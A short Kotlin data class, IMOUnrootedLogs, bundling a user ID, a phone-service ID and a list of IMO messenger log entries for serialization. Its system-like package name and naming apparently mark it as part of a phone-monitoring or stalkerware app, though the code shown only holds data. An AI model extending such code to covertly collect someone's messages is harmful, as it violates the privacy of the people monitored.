package com.android.services.models

import com.android.services.db.entities.IMOUnrooted
import com.google.gson.annotations.SerializedName

class IMOUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var iMOUnrootedList: List<IMOUnrooted>? = null
        private set

    constructor()
    constructor(userId: String?, phoneServiceId: String?, imoUnrootedList: List<IMOUnrooted>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        iMOUnrootedList = imoUnrootedList
    }
}